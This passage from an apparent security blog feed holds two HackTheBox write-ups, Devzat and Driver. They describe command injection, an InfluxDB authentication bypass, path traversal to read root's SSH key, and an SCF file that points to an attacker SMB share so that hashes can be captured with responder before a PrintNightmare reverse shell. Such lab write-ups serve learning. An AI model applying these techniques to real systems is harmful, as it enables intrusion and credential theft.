|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://devzat.htb/
8000/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
| ssh-hostkey: 
|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.70%I=7%D=10/17%Time=616BD594%P=x86_64-pc-linux-gnu%r(N
SF:ULL,C,"SSH-2\.0-Go\r\n");
Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 17 08:50:17 2021 -- 1 IP address (1 host up) scanned in 71.63 seconds
</code></pre>
<p><br /></p>

<h3 id="web">Web</h3>

<p><img src="/assets/img/20211017085159.png" alt="" /></p>

<p><img src="/assets/img/20211017085740.png" alt="" /></p>

<p>Possible username <code class="language-plaintext highlighter-rouge">patrick</code>?</p>

<p><img src="/assets/img/20211017085822.png" alt="" /></p>

<p>Connecting to the SSH service on port <strong>8000</strong> gave the below output;</p>

<p><img src="/assets/img/20211017090318.png" alt="" /></p>

<p><img src="/assets/img/20211017090432.png" alt="" /></p>

<p>Attempts to log in as the user <em>patrick</em> kept failing, saying it’s reserved for local use. This may be because the user <em>patrick</em> is the admin.</p>

<p>Bruteforcing virtual hosts using <code class="language-plaintext highlighter-rouge">ffuf</code> discovered one;</p>

<p><img src="/assets/img/20211017092446.png" alt="" />
<br /></p>

<hr />
<h3 id="pets">Pets</h3>
<p><br /></p>

<p><img src="/assets/img/20211017092715.png" alt="" /></p>

<p><img src="/assets/img/20211017092740.png" alt="" /></p>

<p>The add pet form above is used to add an entry to the pets list. Adding a pet generated the request;</p>

<p><img src="/assets/img/20211017093153.png" alt="" /></p>

<p>Bruteforcing the web root with <code class="language-plaintext highlighter-rouge">ffuf</code> kept giving <strong>200</strong> responses, even for invalid paths. Viewing the page source showed it is dynamically generated by a JavaScript code;</p>

<p><img src="/assets/img/20211017093348.png" alt="" /></p>

<p>So I downloaded the file and parsed it with <code class="language-plaintext highlighter-rouge">js-beautify</code> for easier analysis. I found the block of code that generates the request used for adding pets, and nothing more of interest;</p>

<p><img src="/assets/img/20211017094040.png" alt="" /></p>

<p>Newly added pet entries can be seen immediately after they have been added, but refreshing the page makes them disappear.
<br /></p>

<h4 id="fuzzing-the-json-data">Fuzzing the JSON data</h4>
<p><br /></p>

<p>Deleting all the parameters doesn’t have any visible effect on the parser at first, and the web app responded with <strong>Pet was added successfully</strong>. Breaking the JSON syntax produced an error message;</p>

<p><img src="/assets/img/20211017095228.png" alt="" /></p>

<p>Sometimes even after getting a success message from the POST request, reloading the JSON data does not show the new pet entry. However, after submitting only the <code class="language-plaintext highlighter-rouge">name</code> parameter, reloading the pets JSON data by sending GET request to <code class="language-plaintext highlighter-rouge">/api/pet</code> showed a new response;</p>

<p><img src="/assets/img/20211017102637.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">species</code> parameter is not being returned in the JSON data of the pets, but appears to be used to construct the <code class="language-plaintext highlighter-rouge">characteristics</code> parameter that describes the species. I assumed it’s being used to load the characteristics data, which will make it an interesting target for injection attacks like LFI and SQLi.</p>

<p>After adding a <code class="language-plaintext highlighter-rouge">characteristics</code> parameter in the submitted JSON, it is overwritten in the JSON response obtained if the value given to the <code class="language-plaintext highlighter-rouge">species</code> parameter is valid (e.g: <code class="language-plaintext highlighter-rouge">cat</code>), but if it is not valid, the <code class="language-plaintext highlighter-rouge">characteristics</code> parameter in the JSON response gets set to <code class="language-plaintext highlighter-rouge">exit status 1</code>.</p>

<p>The message <code class="language-plaintext highlighter-rouge">exit status 1</code> is very interesting because that is usually the result of a function call or some system command. Return codes that are not equal to <code class="language-plaintext highlighter-rouge">0</code> usually indicate an error. So I started fuzzing the <code class="language-plaintext highlighter-rouge">species</code> and <code class="language-plaintext highlighter-rouge">characteristics</code> parameters for <em>Command Injection</em> flaws, and caught a break. The parameter <code class="language-plaintext highlighter-rouge">species</code> is vulnerable to command injection;</p>

<p><img src="/assets/img/20211017110307.png" alt="" /></p>

<p><img src="/assets/img/20211017110358.png" alt="" /></p>

<p>I then exploited the command injection to gain access to the box as the user <code class="language-plaintext highlighter-rouge">patrick</code>;</p>

<p><img src="/assets/img/20211017110726.png" alt="" /></p>

<p>Going through the source code of the web app at <code class="language-plaintext highlighter-rouge">/home/patrick/pets</code>, I found the vulnerable code that let me in;</p>

<p><img src="/assets/img/20211017111317.png" alt="" /></p>

<p>It looks like the code is also vulnerable to <em>local file inclusion (LFI)</em>.</p>

<p><br /></p>

<hr />
<h3 id="user">User</h3>
<p><br /></p>

<p>The user <code class="language-plaintext highlighter-rouge">patrick</code> does not have the user flag, but it was found in the home of <code class="language-plaintext highlighter-rouge">catherine</code>.</p>

<p>Inside the home directory of <em>patrick</em>, source code for the web apps were found, including a binary named <code class="language-plaintext highlighter-rouge">petshop</code> in the <code class="language-plaintext highlighter-rouge">~/pets</code> directory.</p>

<p>Using <code class="language-plaintext highlighter-rouge">linPEAS</code> and manual enumeration didn’t yield anything interesting. <code class="language-plaintext highlighter-rouge">netstat</code> idenitified a bunch of locally running services, so I setup some SSH tunnels so I can scan them from my box;</p>

<p><img src="/assets/img/20211019010046.png" alt="" /></p>

<p>I then ran an <code class="language-plaintext highlighter-rouge">nmap</code> scan on the ports to identify the services they are running;</p>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Tue Oct 19 01:02:17 2021 as: nmap -sV -p6010,8443,53,8086 -oN nmap-hidden.txt localhost
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00023s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE  SERVICE VERSION
53/tcp   closed domain
6010/tcp open   x11?
8086/tcp open   http    InfluxDB http admin 1.7.5
8443/tcp open   ssh     (protocol 2.0)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.70%I=7%D=10/19%Time=616E0B10%P=x86_64-pc-linux-gnu%r(N
SF:ULL,C,"SSH-2\.0-Go\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 19 01:03:12 2021 -- 1 IP address (1 host up) scanned in 55.43 seconds
</code></pre>

<p>The service on port <strong>8086</strong> has been identified as a HTTP service, and viewing it in a browser just give a <strong>404 Not found</strong>. Bruteforcing with <strong>ffuf</strong> found a few paths;</p>

<p><img src="/assets/img/20211019010801.png" alt="" /></p>

<p>Going to the <code class="language-plaintext highlighter-rouge">/query</code> path gave an authentication prompt;</p>

<p><img src="/assets/img/20211019011007.png" alt="" /></p>

<p>Googling showed that the version of <strong>InfluxDB</strong> on the host is vulnerable to authentication bypass, and was exploited using a python code obtained from the repo https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933</p>

<p><img src="/assets/img/20211019014045.png" alt="" /></p>

<p><em>InfluxDB</em> is something I have never came across before, so I had to do a lot of googling to learn about it. Using a cheatsheet I found on <em>GitHub</em> at https://gist.github.com/tomazursic/6cc217e2644c619ceceefb8ce824925b, I was able to enumerate the service and found a hash for the user <code class="language-plaintext highlighter-rouge">catherine</code> in the <strong>devzat</strong> database inside the <strong>user</strong> measurement;</p>

<p><img src="/assets/img/20211019165251.png" alt="" /></p>

<p><img src="/assets/img/20211019165415.png" alt="" /></p>

<p>The password <code class="language-plaintext highlighter-rouge">woBeeYareedahc7Oogeephies7Aiseci</code> does not appear to be a hash, so I just used to access the account of <em>catherine</em> on the host, and it worked;</p>

<p><img src="/assets/img/20211019165646.png" alt="" />
<br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>The user <em>catherine</em> does not have permission to run any command on the host using <code class="language-plaintext highlighter-rouge">sudo</code>. No files of interest were found in her home directory, so I ran <code class="language-plaintext highlighter-rouge">linPEAS</code> again in hope of finding something new, but it didn’t.</p>

<p>Inside <code class="language-plaintext highlighter-rouge">/var/backups</code>, 2 backup files belonging to <em>catherine</em> were found. The files were extracted, but nothing of interest was found inside at a quick glance;</p>

<p><img src="/assets/img/20211019172320.png" alt="" /></p>

<p>Connecting to the SSH chat service locally on port <strong>8443</strong> as <em>catherine</em> showed some interesting messages from <em>patrick</em>;</p>

<p><img src="/assets/img/20211019214956.png" alt="" /></p>

<p>Since the default backups directory in linux is <code class="language-plaintext highlighter-rouge">/var/backups</code>, and the only files of interest in the directory are the previously discovered <em>.zip</em> files, I extracted them again to <code class="language-plaintext highlighter-rouge">/dev/shm</code>, and run the <code class="language-plaintext highlighter-rouge">diff</code> command on their extracted files, and found a password <code class="language-plaintext highlighter-rouge">CeilingCatStillAThingIn2021?</code>;</p>

<p><img src="/assets/img/20211019215441.png" alt="" /></p>

<p>Attempt to login as the root user using the password failed. In the text messages <em>patrick</em> talked about implementing a new feature that requires a password, so I continue to examine the output generated by the <code class="language-plaintext highlighter-rouge">diff</code> command, and noticed a function that appears to be used to read files from disk provided a path and a valid password were provided;</p>

<p><img src="/assets/img/20211019220815.png" alt="" /></p>

<p>So I logged back into the chat app as <em>catherine</em> and listed available commands using the <code class="language-plaintext highlighter-rouge">/help</code> command. One entry stood out;</p>

<p><img src="/assets/img/20211019220941.png" alt="" /></p>

<p>This is likely the command used to invoke the function used to read files using a path and a password. So I tried to read the file <code class="language-plaintext highlighter-rouge">/etc/hostname</code> to see if it works, which did not work because the application is prefixing <code class="language-plaintext highlighter-rouge">/root/devzat</code> to the filename given, as indicated by the error message. Using a simple path traversal payload, I was able to read the SSH key file of the <code class="language-plaintext highlighter-rouge">root</code> user;</p>

<p><img src="/assets/img/20211019221352.png" alt="" /></p>

<p>I copied the SSH key to my attack box, and used it to access the box as the <code class="language-plaintext highlighter-rouge">root</code> user over SSH;</p>

<p><img src="/assets/img/20211019221510.png" alt="" />
<br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified services running on the host using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Found the username <strong>patrick</strong> on the web page, which is not allowed to be used remotely on the SSH chat service.</li>
  <li>Found a hidden subdomain <strong>pets.devzat.htb</strong> using <code class="language-plaintext highlighter-rouge">ffuf</code>
    <ul>
      <li>Fuzzing the JSON data submitted to the web app via POST request uncovered a <em>command injection</em> flaw, which was exploited to gain access to the box as the user <strong>patrick</strong>.</li>
    </ul>
  </li>
  <li>Inside the box as <strong>patrick</strong>;
    <ul>
      <li>Identified another user named <strong>catherine</strong>.</li>
      <li>Discovered a local installation of <em>InfluxDB</em> that is vulnerable to authentication bypass, and was enumerated to obtain a password that gave access to the account of <strong>catherine</strong>.</li>
    </ul>
  </li>
  <li>Inside the box as <strong>catherine</strong>;
    <ul>
      <li>Connected to the local SSH chat service on port <strong>8443</strong> as <strong>catherine</strong>.</li>
      <li>Received a chat log between <strong>patrick</strong> and <strong>catherine</strong> discussing a new feature that is password-protected, with the password obtainable from backup files in the default linux backups directory.</li>
      <li>Located the password inside the backups and used it to access the feature, which is used to read files from disk. I used it to load the SSH private key of the root user.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="cve" /><category term="command injection" /><category term="influxdb" /><category term="path traversal" /><category term="tunneling" /><category term="custom exploitation" /><summary type="html"><![CDATA[Devzat is a pretty easy medium linux box. It starts with a website that inform you about a chat service on the host accessible on port 8000. Some enumeration will yield a hidden subdomain that’s vulnerable to command injection. Once inside the box, there is an instance of InfluxDB running locally that’s vulnerable to CVE-2019-20933, which you can use to gain access to the box as another local user. Privesc involves exploiting a path traversal flaw in a custom code.]]></summary></entry><entry><title type="html">Driver - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/driver.html" rel="alternate" type="text/html" title="Driver - HackTheBox" /><published>2022-02-26T00:00:00+01:00</published><updated>2022-02-26T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/driver</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/driver.html"><![CDATA[<p><strong>Driver</strong> is a fun and easy windows box. It’s running a web service that allows for file uploads, which you can exploit to perform an <em>SCF File Attack</em> to capture and crack the password of a local user using <code class="language-plaintext highlighter-rouge">responder</code>. After cracking the hash, you can exploit the <em>Print Nightmare</em> vulnerability to gain a privileged access to the box.</p>

<h3 id="about">About</h3>
<p><br /></p>

<p><img src="/assets/img/20211005084532.png" alt="" /></p>

<p><img src="/assets/img/20211005084600.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Tue Oct  5 08:48:12 2021 as: nmap -sV -sC -v -oN nmap.txt 10.10.11.106
Nmap scan report for 10.10.11.106
Host is up (0.28s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h14m09s, deviation: 0s, median: 7h14m09s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-05 16:03:00
|_  start_date: 2021-10-05 12:34:03

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct  5 08:49:26 2021 -- 1 IP address (1 host up) scanned in 74.97 seconds

</code></pre>

<p>Complete port scan showed <em>winrm</em> on port <strong>5985</strong>;</p>

<p><img src="/assets/img/20211005095636.png" alt="" /></p>

<h4 id="web">Web</h4>

<p><img src="/assets/img/20211005085101.png" alt="" /></p>

<p><img src="/assets/img/20211005085120.png" alt="" /></p>

<p>Login attempt using the credentials of <code class="language-plaintext highlighter-rouge">admin:admin</code> granted access;</p>

<p><img src="/assets/img/20211005085453.png" alt="" /></p>

<p>All the links in the navigation are dead, except one that allows for driver upload for firmware update;</p>

<p><img src="/assets/img/20211005091114.png" alt="" /></p>

<p>Request generated by file upload;</p>

<p><img src="/assets/img/20211005092123.png" alt="" /></p>

<p>On successful file upload;</p>

<p><img src="/assets/img/20211005092218.png" alt="" /></p>

<p>Use of the creds to access SMB failed, <code class="language-plaintext highlighter-rouge">rpcclient</code> null auth also failed;</p>

<p><img src="/assets/img/20211005090833.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">CrackMapExec</code> also showed it’s not a valid SMB cred;</p>

<p><img src="/assets/img/20211005095946.png" alt="" /></p>

<p>Googling the title of the firmware update page kept linking me to the <em>PrintNightmare</em> vulnerabiity, but I was unable to exploit as I don’t have access to the SMB service.</p>

<p><br /></p>

<hr />
<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>After a lot of googling as I am not very familiar with windows, I was introduced to SCF File Attacks. This attack can be exploited to capture SMB credentials by making authenticated users try to access an SMB service in an attackers control. I crafted a simple SCF file with the contents;</p>

<pre><code class="language-raw">[Shell]
Command=2
IconFile=\\10.10.14.95\Badshare\file.txt

[Taskbar]
command=ToggleDesktop
</code></pre>

<p>Note that <code class="language-plaintext highlighter-rouge">IconFile</code> points to an SMB service running on my attack host. I used the upload form in the website and uploaded it as <code class="language-plaintext highlighter-rouge">@exploit.scf</code>. The <code class="language-plaintext highlighter-rouge">@</code> symbol will move the file to the top of the share driver, or so I read, and it will be executed the moment a user browses the share.</p>

<p>With responder running on my attack host with the command <code class="language-plaintext highlighter-rouge">sudo responder -wrf --lm -v -I tun0</code>, I was able to capture the hash of a user named <strong>tony</strong>;</p>

<p><img src="/assets/img/20211027122030.png" alt="" /></p>

<p>Feeding the hash to <code class="language-plaintext highlighter-rouge">john</code>, it had no problems cracking it;</p>

<p><img src="/assets/img/20211027122209.png" alt="" /></p>

<p>With the hash cracked, I had all I need to run <em>PrintNightmare</em>. I setup an SMB share with the name <em>Test</em> in a temporary directory on my attack host using Samba, and enabled anonymous logins. I used <code class="language-plaintext highlighter-rouge">msfvenom</code> to generate the DLL payload required by the exploit, and moved it into the root directory of the SMB share. The exploit ran through all it’s three (3) stages, but I couldn’t get a connection back. Running <code class="language-plaintext highlighter-rouge">inotifywait -e CLOSE meterpreter.dll</code> showed that the DLL was read when running the exploit.</p>

<p>The payload I initially used was <code class="language-plaintext highlighter-rouge">windows/meterpreter/reverse_tcp</code>, so I changed it to <code class="language-plaintext highlighter-rouge">windows/x64/shell_reverse_tcp</code>;</p>

<p><img src="/assets/img/20211027171430.png" alt="" /></p>

<p>Running the exploit again, I got a high privilege shell on the box, sparing me the need for any sort of privesc;</p>

<p><img src="/assets/img/20211027171557.png" alt="" /></p>

<p><img src="/assets/img/20211027171647.png" alt="" /></p>

<p><img src="/assets/img/20211027171750.png" alt="" /></p>

<p>I found the user flag inside <code class="language-plaintext highlighter-rouge">C:\Users\tony\Desktop</code>, and the root flag in <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\Desktop</code>.</p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified running services using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Got a login form on the website, which accept the credential <code class="language-plaintext highlighter-rouge">admin:admin</code></li>
  <li>Found a firmware update page in the admin panel that allows for file upload.</li>
  <li>Performed an SCF File Attack to capture the SMB hash of a user named <strong>tony</strong> using <code class="language-plaintext highlighter-rouge">responder</code>, and cracked it using <code class="language-plaintext highlighter-rouge">john</code>.</li>
  <li>Ran a <em>PrintNightmare</em> exploit on the target to gain a privileged access on the box.</li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="windows" /><category term="smb" /><category term="scf file attack" /><category term="print nightmare" /><category term="responder" /><category term="metasploit" /><category term="msfvenom" /><category term="smb" /><summary type="html"><![CDATA[Driver is a fun and easy windows box. It’s running a web service that allows for file uploads, which you can exploit to perform an SCF File Attack to capture and crack the password of a local user using responder. After cracking the hash, you can exploit the Print Nightmare vulnerability to gain a privileged access to the box.]]></summary></entry></feed>